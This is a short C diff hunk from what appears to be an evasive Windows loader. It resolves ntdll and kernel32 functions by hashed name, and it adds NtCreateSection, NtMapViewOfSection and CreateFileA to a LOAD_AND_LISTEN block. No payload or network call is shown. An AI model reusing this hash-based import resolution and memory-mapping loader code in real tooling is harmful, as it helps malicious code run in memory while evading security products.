@@ -43,11 +43,15 @@ BOOL LdrAllocateCoreStructsAndLoadApis() {
 	ldr->win32->NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetProc(ntdll, HASHED_NtFreeVirtualMemory);
 	ldr->win32->NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProc(ntdll, HASHED_NtWriteVirtualMemory);
 	ldr->win32->CloseHandle = (pCloseHandle)GetProc(kernel32, HASHED_CloseHandle);
+	ldr->win32->NtDelayExecution = (pNtDelayExecution)GetProc(ntdll, HASHED_NtDelayExecution);
+
 #ifdef LOAD_AND_LISTEN
 	ldr->win32->CreateThread = (pCreateThread)GetProc(kernel32, HASHED_CreateThread);
 	ldr->win32->RegisterWaitForSingleObject = (pRegisterWaitForSingleObject)GetProc(kernel32, HASHED_RegisterWaitForSingleObject);
 	ldr->win32->FreeLibrary = (pFreeLibrary)GetProc(kernel32, HASHED_FreeLibrary);
-	ldr->win32->NtDelayExecution = (pNtDelayExecution)GetProc(ntdll, HASHED_NtDelayExecution);
+	ldr->win32->CreateFileA = (pCreateFileA)GetProc(kernel32, HASHED_CreateFileA);
+	ldr->win32->NtCreateSection = (pNtCreateSection)GetProc(ntdll, HASHED_NtCreateSection);
+	ldr->win32->NtMapViewOfSection = (pNtMapViewOfSection)GetProc(ntdll, HASHED_NtMapViewOfSection);
 #endif
 
 	return TRUE;
